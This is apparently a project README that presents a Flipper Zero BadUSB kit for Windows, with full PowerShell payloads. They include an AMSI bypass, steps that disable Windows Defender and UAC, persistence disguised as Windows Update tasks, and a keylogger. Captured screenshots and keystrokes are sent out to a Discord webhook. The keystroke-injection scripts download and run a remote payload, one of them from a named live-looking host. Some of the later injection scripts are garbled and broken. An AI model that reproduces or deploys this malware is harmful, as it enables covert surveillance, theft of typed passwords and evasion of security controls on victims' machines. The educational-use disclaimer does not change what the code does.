# 🦆 Rubber Ducky BadUSB for Flipper Zero 🖥️

Welcome to the **Rubber Ducky BadUSB for Flipper Zero** project! This tool is designed to automate the deployment of a PowerShell script on a Windows computer using a Flipper Zero device. The script includes a keylogger, screen-sharing functionality, and various bypass techniques to ensure persistence and avoid detection. 

⚠️ **Disclaimer**: This project is for educational and ethical purposes only. Misuse of this tool is strictly prohibited. Use responsibly and only on systems you own or have explicit permission to test.

---

## 🛠️ Features

1. Keylogger: Captures keystrokes and logs them to a file.
2. Screen Sharing: Takes screenshots and sends them to a Discord webhook.
3. AMSI Bypass: Disables AMSI to avoid detection by antivirus software.
4. Firewall Bypass: Allows PowerShell to communicate through the firewall by adding a new firewall rule to allow incoming connections on port 8080.
5. UAC Bypass: Elevates privileges to run the script without restrictions by modifying registry entries, specifically 'EnableLUA'.
6. WMI Event Subscription: Ensures the script runs on system logon.
7. Automatic Restart: Ensures the script runs after shutdown or reboot.
8. Missing Software Installation: Installs required dependencies like .NET Framework and PowerShellGet.
9. Windows Defender Disablement: Stops and disables Windows Defender service, as well as disables real-time protection, allowing for uninterrupted execution of the script.
10. Signature Check Disablement: Modifies registry entries to potentially disable signature-based checks, further avoiding detection by security software.
11. PowerShell Execution Policy Modification: Sets PowerShell execution policy to bypass restrictions, enabling the execution of scripts without limitations.
12. Optional Restoration of Security Settings: Provides options to restore Windows Defender real-time protection, restart and re-enable Windows Defender service, remove added firewall rules, and re-enable User Account Control (UAC) for system security after script execution is completed.

---

## 📦 Prerequisites

Before you begin, ensure you have the following:

1. **Flipper Zero**: A device capable of emulating a USB keyboard.
2. **Windows Computer**: The target system where the script will be deployed.
3. **Discord Webhook URL**: A URL to send captured data (keylogs and screenshots).
4. **PowerShell**: Installed on the target system.
5. **Server**: A server to host the `payload.ps1` script.

---

## 🚀 Step-by-Step Tutorial

### **Step 1: Understanding the Execution Order**

To ensure the script works as intended, the following order of operations must be followed:

1. **AMSI Bypass**: Disable AMSI to avoid detection.
2. **Install Missing Software**: Ensure all required dependencies (e.g., .NET Framework, PowerShellGet) are installed.
3. **Firewall Bypass**: Allow PowerShell to communicate through the firewall.
4. **UAC Bypass**: Elevate privileges to ensure the script can run without restrictions.
5. **WMI Event Subscription**: Set up persistence to ensure the script runs on logon.
6. **Automatic Restart**: Ensure the script runs after shutdown/reboot.
7. **Keylogger and Screen Sharing**: Start the keylogger and screen-sharing functions.

---

### **Step 2: Modified PowerShell Script**

Save this as `payload.ps1`.

```powershell
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Discord Webhook URL
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"

# Install Missing Plugins/Software
function Install-RequiredSoftware {
    # Check if .NET Framework is installed
    if (-not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing .NET Framework..."
        Invoke-WebRequest -Uri "https://dotnet.microsoft.com/download/dotnet-core/scripts/v1/dotnet-install.ps1" -OutFile "$env:temp\dotnet-install.ps1"
        Invoke-Expression "$env:temp\dotnet-install.ps1 -Channel Current"
    }

    # Check if PowerShellGet module is installed
    if (-not (Get-Module -ListAvailable -Name PowerShellGet)) {
        Write-Output "Installing PowerShellGet module..."
        Install-PackageProvider -Name NuGet -Force
        Install-Module -Name PowerShellGet -Force -AllowClobber
    }

    # Check if WebClient is available
    if (-not (Get-Command "Invoke-WebRequest" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing WebClient..."
        Install-WindowsFeature -Name Web-Client
    }
}

# Firewall Bypass
New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Program "powershell.exe"

# UAC Bypass
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:temp\payload.ps1" -Verb RunAs

# WMI Event Subscription for Persistence
$wmiScript = @"
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'BadUSB_Filter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'BadUSB_Consumer'
    CommandLineTemplate = "powershell -ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
"@
Invoke-Expression $wmiScript

# Automatic Restart on Shutdown/Reboot
$restartScript = @"
$taskName = "BadUSB_Restart"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
"@
Invoke-Expression $restartScript

# Install Required Software
Install-RequiredSoftware

# Keylogger Function
function Start-Keylogger {
    $keyloggerScript = @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logFile = "$env:temp\\keylog.txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void Main() {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                System.IO.File.AppendAllText(logFile, key + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
"@
    Add-Type -TypeDefinition $keyloggerScript
    [Keylogger]::Main()
}

# Screen Sharing Function
function Start-ScreenShare {
    $screenShareScript = @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Net;
    using System.Threading;
    public class ScreenShare {
        private static string webhookUrl = "$webhookUrl";
        private static int interval = 5000; // 5 seconds

        public static void Main() {
            while (true) {
                try {
                    using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)) {
                        using (Graphics g = Graphics.FromImage(bmp)) {
                            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                        }
                        using (MemoryStream ms = new MemoryStream()) {
                            bmp.Save(ms, ImageFormat.Jpeg);
                            byte[] imageBytes = ms.ToArray();
                            string base64Image = Convert.ToBase64String(imageBytes);
                            SendToDiscord(base64Image);
                        }
                    }
                } catch { }
                Thread.Sleep(interval);
            }
        }

        private static void SendToDiscord(string base64Image) {
            string jsonPayload = "{\"content\":\"Screenshot\",\"embeds\":[{\"image\":{\"url\":\"data:image/jpeg;base64," + base64Image + "\"}}]}";
            using (WebClient client = new WebClient()) {
                client.Headers.Add("Content-Type", "application/json");
                client.UploadString(webhookUrl, "POST", jsonPayload);
            }
        }
    }
"@
    Add-Type -TypeDefinition $screenShareScript
    [ScreenShare]::Main()
}

# Start Keylogger and Screen Sharing
Start-Keylogger
Start-ScreenShare
```

---

### **Step 3: Creating the Flipper Zero Payload**

The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:

```
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://your-server.com/payload.ps1' -OutFile '$env:temp\payload.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\payload.ps1' -Verb RunAs"
DELAY 1000
ENTER
```

---

### **Step 2: (2nd version)Modified PowerShell Script**

Save this as `payload.ps1`.

```

# Stage 1: Initialization and Elevation
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$env:temp\payload.ps1`"" -Verb RunAs
    Exit
}

# Stage 2: Environment Preparation
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhookUrl = "YOUROWNDISCORDWEBHOOKURL"

# Stage 3: System Modifications
New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Action Allow -Program "powershell.exe" -ErrorAction SilentlyContinue

# Stage 4: Persistence Mechanisms
$persistenceScript = {
    $wmiArgs = @{
        EventNamespace = 'root/cimv2'
        Name = 'WindowsUpdateMonitor'
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
        QueryLanguage = 'WQL'
    }
    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $wmiArgs

    $consumerArgs = @{
        Name = 'WindowsUpdateTask'
        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    }
    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

    $bindingArgs = @{
        Filter = [Ref]$filter
        Consumer = [Ref]$consumer
    }
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs

    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsUpdateMaintenance" -Action $taskAction -Trigger $taskTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
}

Invoke-Command -ScriptBlock $persistenceScript

# Stage 5: Background Operations
Start-Job -Name "Keylogger" -ScriptBlock {
    Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logPath = Path.Combine(Path.GetTempPath(), "systemlog.txt");
        
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                File.AppendAllText(logPath, ((Keys)vkCode).ToString() + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static void Main() {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(curModule.ModuleName), 0);
            }
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
"@
    [Keylogger]::Main()
}

Start-Job -Name "ScreenCapture" -ScriptBlock {
    while ($true) {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            $memoryStream = New-Object System.IO.MemoryStream
            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bytes = $memoryStream.ToArray()
            $base64 = [Convert]::ToBase64String($bytes)
            
            $payload = @{
                content = "System Update Report"
                embeds = @(@{
                    image = @{
                        url = "data:image/jpeg;base64,$base64"
                    }
                })
            }
            
            Invoke-RestMethod -Uri $using:webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Start-Sleep -Seconds 30
    }
}

# Stage 6: Cleanup and Maintenance
while ($true) {
    try {
        Get-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            $payload = @{ content = "System Log: $_" }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        }
        Clear-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Minutes 15
}
```

---

### **Step 3: (2nd version) Creating the Flipper Zero Payload**

The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:

```
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadFile(\`"LINKTOYOUROWNHOSTOF.PS1\`", \`"$env:temp\payload.ps1\`"); Start-Process powershell -ArgumentList \`"-ExecutionPolicy Bypass -File $env:temp\payload2.ps1\`" -Verb RunAs\"'"
DELAY 1000
ENTER
```

---
### **Step 2: 3d version)Modified PowerShell Script**

Save this as `payload.ps1`.

```

# Stage 1: Initialization and Elevation
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$env:temp\payload.ps1`"" -Verb RunAs
    Exit
}

# Stage 2: Environment Preparation
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhookUrl = "YOUROWNDISCORDWEBHOOKURL"

# Stage 3: System Modifications
New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Action Allow -Program "powershell.exe" -ErrorAction SilentlyContinue

# Stage 4: Persistence Mechanisms
$persistenceScript = {
    $wmiArgs = @{
        EventNamespace = 'root/cimv2'
        Name = 'WindowsUpdateMonitor'
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
        QueryLanguage = 'WQL'
    }
    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $wmiArgs

    $consumerArgs = @{
        Name = 'WindowsUpdateTask'
        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    }
    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

    $bindingArgs = @{
        Filter = [Ref]$filter
        Consumer = [Ref]$consumer
    }
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs

    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsUpdateMaintenance" -Action $taskAction -Trigger $taskTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
}

Invoke-Command -ScriptBlock $persistenceScript

# Stage 5: Background Operations
Start-Job -Name "Keylogger" -ScriptBlock {
    Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logPath = Path.Combine(Path.GetTempPath(), "systemlog.txt");
        
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                File.AppendAllText(logPath, ((Keys)vkCode).ToString() + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static void Main() {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(curModule.ModuleName), 0);
            }
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
"@
    [Keylogger]::Main()
}

Start-Job -Name "ScreenCapture" -ScriptBlock {
    while ($true) {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            $memoryStream = New-Object System.IO.MemoryStream
            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bytes = $memoryStream.ToArray()
            $base64 = [Convert]::ToBase64String($bytes)
            
            $payload = @{
                content = "System Update Report"
                embeds = @(@{
                    image = @{
                        url = "data:image/jpeg;base64,$base64"
                    }
                })
            }
            
            Invoke-RestMethod -Uri $using:webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Start-Sleep -Seconds 30
    }
}

# Stage 6: Cleanup and Maintenance
while ($true) {
    try {
        Get-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            $payload = @{ content = "System Log: $_" }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        }
        Clear-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Minutes 15
}
```

---

### **Step 3: (3nd version) Creating the Flipper Zero Payload**

The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:

```
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Force"
DELAY 500
ENTER

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -Command "$regPath = 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System'; $name = 'EnableLUA'; $value = 0; New-ItemProperty -Path $regPath -Name $name -Value $value -PropertyType DWORD -Force"
DELAY 500
ENTER

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -Command "Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
DELAY 500
ENTER

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"
DELAY 500
ENTER

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -Command "New-NetFirewallRule -DisplayName 'AllowIncoming8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -Enabled True"
-delay 500 
ENTER

delay 1000 
gui r 
delay 500 
string powershell.exe –command “$regPathNP = ‘HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\NetworkList’; $nameNP = ‘NC_Signature_Enabled’; $valueNP = ‘0’ ; New-ItemProperty –path $regPathNP –Name $nameNP –Value ”$valueNP”–propertytype dword –force”
delay   enter 

# Your other script logic here...

delay    gui R  
string Powershell .exe  
enter delay    
Delay    string set-MpPreference-disableRealTimeMonitoring `$false   
 Delay    Enter  

Delay     # Optional: Start and enable Windows Defender services if previously stopped and disabled    
 Delay      Gui R  
 Delay      String Powershell .exe   
 enter delay    
 string start-service-name WinDefend  
enter delay      
String set-service-name windefend-startupType automatic   
 enter delay   

Delay     Remove the newly added rule when done (optional)   
 delay    Gui R  
 string Powershell .exe     
 Enter Delay      
string remove-netfirewallrule-displayname allowincoming8080        
Enter Delay    

 #Optional: Re-enable UAC(User Account Control) when done     
 delay      gui R    
 String Powershell .exe     
Enter Delay        
String   `$ regpathReenableUac=‘HKLM:\\\\SOFTWARE \\\\Microsoft \\\\Windows \\\\CurrentVersion \\\\Policies \\\\System‘;$namereenableuac=‘EnableLUA’;$valuereenableuac=1 ;New-itemproperty-path `$ regpathReenableUac-name `$ namereenableuac-value `$ valuereenableuac-propertytype dword-force       
Enter       
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://tgmannen.infinityfreeapp.com/1/payload.ps1' -OutFile '$env:temp\payload.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\payload.ps1' -Verb RunAs"
DELAY 1000
ENTER
```

---
### **Step 3: (3d version) Creating the Flipper Zero Payload**

The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:

```
DELAY 1000
# Open Run dialog
GUI r
DELAY 500
# Set PowerShell execution policy to bypass restrictions
STRING powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Force"
DELAY 500
ENTER

DELAY 1000
# Open Run dialog again
GUI r
DELAY 500
# Disable User Account Control (UAC) by modifying registry
STRING powershell.exe -Command "
# Define registry entry name and path
name = 'EnableLUA';
regPath -Name
# Set value to disable UAC
value -PropertyType DWORD -Force"
DELAY 500
ENTER

DELAY 1000
# Open Run dialog
GUI r
DELAY 500
# Stop and disable Windows Defender service
STRING powershell.exe -Command "Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
DELAY 500
ENTER

DELAY 1000
# Open Run dialog
GUI r
DELAY 500
# Disable Windows Defender real-time protection
STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"
DELAY 500
ENTER

DELAY 1000
# Open Run dialog
GUI r
DELAY 500
# Add a new firewall rule to allow incoming connections on port 8080
STRING powershell.exe -Command "New-NetFirewallRule -DisplayName 'AllowIncoming8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -Enabled True"
DELAY 500
ENTER

DELAY 1000
# Open Run dialog
GUI r
DELAY 500
# Modify additional security settings (potentially disables signature checks)
STRING powershell.exe –command "
# Define registry entry name and path
nameNP = 'NC_Signature_Enabled';
regPathNP –Name
# Set value to disable signature-based checks
valueNP -PropertyType DWORD -Force"
DELAY 500
ENTER

# Optional: Restore Windows Defender real-time protection
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe
ENTER
# Enable real-time monitoring again
STRING set-MpPreference -DisableRealTimeMonitoring `$false
DELAY 500
ENTER

# Optional: Restart and re-enable Windows Defender service
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe
ENTER
# Start the service
STRING start-service -Name WinDefend
DELAY 500
ENTER
# Set the startup type back to automatic
STRING set-service -Name WinDefend -StartupType Automatic
DELAY 500
ENTER

# Optional: Remove the previously added firewall rule
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe
ENTER
# Remove the rule allowing inbound traffic on port 8080
STRING remove-netfirewallrule -DisplayName 'AllowIncoming8080'
DELAY 500
ENTER

# Optional: Re-enable User Account Control (UAC)
DELAY 1000
GUI r
DELAY 500
STRING powershell.exe
ENTER
STRING $regpathReenableUac='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';
# Specify name and value for UAC
$namereenableuac='EnableLUA';
$valuereenableuac=1;
# Re-enable UAC
New-ItemProperty -Path $regpathReenableUac -Name $namereenableuac -Value $valuereenableuac -PropertyType DWORD -Force
DELAY 1000
ENTER

```

---

### **Step 4: Hosting the Script**

Upload `payload.ps1` to a server and replace `https://your-server.com/payload.ps1` with the actual URL.

---

### **Step 5: Testing and Deployment**

1. **Test the Script**: Test the script in a controlled environment to ensure it works as expected.
2. **Deploy the Flipper Zero Payload**: Use the Flipper Zero to deploy the payload on the target system.

---

## 🛡️ Ethical Use

This project is intended for educational purposes only. Always ensure you have explicit permission before deploying this tool on any system. Misuse of this tool is strictly prohibited.

---

## 🙏 Credits

- **Flipper Zero**: For providing the hardware platform.
- **PowerShell**: For enabling powerful scripting capabilities.
- **Discord**: For providing webhook functionality.

---

Enjoy the project! 🚀
